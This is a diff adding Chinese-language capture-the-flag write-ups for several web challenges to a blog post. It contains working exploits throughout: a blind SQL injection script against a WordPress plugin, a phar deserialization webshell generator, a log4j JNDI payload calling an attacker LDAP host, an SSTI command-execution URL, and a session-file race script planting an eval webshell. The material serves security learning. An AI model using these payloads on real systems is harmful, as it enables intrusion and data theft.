@@ -361,3 +361,331 @@ http://43.143.7.97:28254/?name={{config.__class__.__init__.__globals__['os']['po
 ```
 
 ![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210052001015.png)
+
+### ohmywordpress
+
+题目给出了网站源码和 dockerfile
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091616173.png)
+
+一开始以为是在 wordpress 里面藏了个免杀的 webshell 需要自己找, 于是用 git diff 看了下和原版源码的差异, 但是并没有看出来什么, 估计是思路偏了
+
+看源码的时候看到了 qwb
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091619684.png)
+
+想起来之前强网杯也有一道 wordpress 的题, 遂去看了下 wp, 思路是 user-meta 插件目录遍历
+
+那么这题应该也差不多, 因为 wordpress 本身的源码已经足够安全了, 它的安全问题主要就来源于第三方主题和插件
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091623746.png)
+
+一共两个插件, 第一个没搜出来什么, 反倒是第二个 simple-link-directory, 存在 sql 注入
+
+[](https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091628711.png)
+
+poc 如下
+
+```bash
+curl 'http://example.com/wp-admin/admin-ajax.php' --data 'action=qcopd_upvote_action&post_id=(SELECT 3 FROM (SELECT SLEEP(5))enz)'
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210091627936.png)
+
+python 脚本
+
+```python
+import requests
+import time
+
+url = 'http://1.14.71.254:28504/wp-admin/admin-ajax.php'
+
+dicts = r'NSSCTF{-abcdef0123456789}'
+
+flag = ''
+
+for i in range(1,99999):
+    for s in dicts:
+        payload = "(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),{},1))={}, sleep(5),0))enz)".format(i,ord(s))
+        start_time = time.time()
+        print(s)
+        res = requests.post(url,data={
+            'action': 'qcopd_upvote_action',
+            'post_id': payload
+            })
+        stop_time = time.time()
+        if stop_time - start_time >= 5:
+            flag += s
+            print('FOUND!!!',flag)
+            break
+```
+
+## Week3
+
+### ez_phar
+
+```php
+<?php
+show_source(__FILE__);
+class Flag{
+    public $code;
+    public function __destruct(){
+    // TODO: Implement __destruct() method.
+        eval($this->code);
+    }
+}
+$filename = $_GET['filename'];
+file_exists($filename);
+?>
+```
+
+简单 phar 反序列化
+
+访问 upload.php
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210141953975.png)
+
+```php
+<?php
+
+class Flag{
+    public $code;
+}
+
+$a = new Flag();
+$a->code = 'system($_GET[1]);';
+
+$phar =new Phar("phar.phar"); 
+$phar->startBuffering();
+$phar->setStub("<?php XXX __HALT_COMPILER(); ?>");
+$phar->setMetadata($a); 
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+?>
+```
+
+上传后的文件在 /upload 目录下
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210141954856.png)
+
+### Fun_php
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+include "k1y.php";
+include "fl4g.php";
+$week_1 = false;
+$week_2 = false;
+
+$getUserID = @$_GET['user']; 
+$getpass = (int)@$_GET['pass']; 
+$getmySaid = @$_GET['mySaid']; 
+$getmyHeart = @$_GET['myHeart']; 
+
+$data = @$_POST['data'];
+$verify =@$_POST['verify'];
+$want = @$_POST['want'];
+$final = @$_POST['final'];
+
+if("Welcom"==0&&"T0"==0&&"1he"==1&&"HNCTF2022"==0)
+    echo "Welcom T0 1he HNCTF2022<BR>";
+
+if("state_HNCTF2022" == 1) echo $hint;
+    else echo "HINT? NoWay~!<BR>";
+
+
+if(is_string($getUserID))
+    $user = $user + $getUserID; //u5er_D0_n0t_b3g1n_with_4_numb3r
+
+if($user == 114514 && $getpass == $pass){
+    if (!ctype_alpha($getmySaid)) 
+        die();
+    if (!is_numeric($getmyHeart)) 
+        die();
+    if(md5($getmySaid) != md5($getmyHeart)){
+        die("Cheater!");
+    }
+    else
+        $week_1 = true;
+}
+
+if(is_array($data)){
+    for($i=0;$i<count($data);$i++){
+
+        if($data[$i]==="Probius") exit();
+
+        $data[$i]=intval($data[$i]);
+    }
+    if(array_search("Probius",$data)===0)
+        $week_2 = true;
+
+    else
+        die("HACK!");
+}
+if($week_1 && $week_2){
+    if(md5($data)===md5($verify))
+        if ("hn" == $_GET['hn'] && "ctf" == $_GET[ctf]) {
+
+            if(preg_match("/php|\fl4g|\\$|'|\"/i",$want)Or is_file($want))
+                die("HACK!");
+       
+                else{
+                    echo "Fine!you win";
+                    system("cat ./$want");
+                 }
+    }
+    else
+        die("HACK!");
+}
+
+?>
+```
+
+代码中有零宽字符, 贴的时候我删掉了
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151134893.png)
+
+前面的 hint 给的很明显了, 考察 php 弱类型中数字与字符串的比较
+
+首先判断 `$user` 和 `$getpass` 的内容
+
+这里的 `$user == 114514` 比较的时候会把 `$user` 转换成数字, 然后再进行比较
+
+而且 `$user = $user + $getUserID` 用的是 `+` 而不是 `.`, 所以会有一个数字相加的问题
+
+如果 `$user` 是以数字开头的话, 类型转换的结果就是 `0-9`, 如果是以字母开头的话, 转换的结果就是 `0`
+
+`$getpass == $pass` 同理, 只需要带入 `0-9` 检验即可
+
+用 burp intruder 跑一下, user 设置成 `114514-[0-9]`, pass 设置成 `0-9`
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151142631.png)
+
+刚开始做的时候跑出来 user 是 114513, 题目应该是又改了一下...
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151143061.png)
+
+后面就是常规的 md5 比较
+
+然后 `array_search` 也会有类型转换的问题, 这里直接用 0, 因为 `Probius` 转换成 int 的结果是 0
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151145952.png)
+
+最后传参 hn 和 ctf, 记得把零宽字符也复制下来
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151149877.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151149735.png)
+
+
+
+### logjjjjlogjjjj
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151150622.png)
+
+log4j 反序列化
+
+[](https://www.freebuf.com/vuls/309584.html)
+
+[](https://github.com/WhiteHSBG/JNDIExploit)
+
+直接用 payload 打就行
+
+启动 ldap
+
+```bash
+java -jar JNDIExploit-1.4-SNAPSHOT.jar -i x.x.x.x -p 65222
+```
+
+get 传参
+
+```
+payload=${jndi:ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho}
+```
+
+注意后面要 urlencode 一次
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151153455.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151154124.png)
+
+查看 flag
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210151155984.png)
+
+### ssssti
+
+简单 ssti, 过滤了下划线, 单双引号
+
+`request.args.a` 用不了, 过滤了 args 关键词, 但是 `request.values.a` 能用
+
+```
+http://43.143.7.127:28093/?name={{lipsum[request.values.a][request.values.b][request.values.c](request.values.d).popen(request.values.e).read()}}&a=__globals__&b=__builtins__&c=__import__&d=os&e=cat /flag
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210171842317.png)
+
+### QAQ_1inclu4e
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201133595.png)
+
+开头有点谜语人, 猜了好久的参数, 最后试出来是 `QAQ`
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201134761.png)
+
+过滤了点号和 php 关键词
+
+换个思路, 尝试 session 文件包含
+
+```python
+import threading
+import requests
+from concurrent.futures import ThreadPoolExecutor, wait
+
+target = 'http://43.143.7.127:28077/index.php'
+flag = 'xxxx'
+
+def upload():
+    files = [
+        ('file', ('xx.txt', 'xxx')),
+    ]
+    data = {'PHP_SESSION_UPLOAD_PROGRESS': "<?php file_put_contents('/tmp/xzxzxz', '<?php eval($_REQUEST[1]);phpinfo();?>');?>"}
+
+    while True:
+        res = requests.post(
+            target,
+            data=data,
+            files=files,
+            cookies={'PHPSESSID': flag},
+        )
+        print('upload',res.text)
+
+
+
+def write():
+    while True:
+        response = requests.get(
+            f'{target}?QAQ=/tmp/sess_{flag}',
+        )
+        print('write',response.text)
+        if 'phpinfo' in response.text:
+            print('success')
+
+for i in range(10):
+    t1 = threading.Thread(target=upload)
+    t2 = threading.Thread(target=write)
+    t1.start()
+    t2.start()
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201135601.png)
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201136614.png)
+
+flag 在 /var 目录下
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210201137228.png)
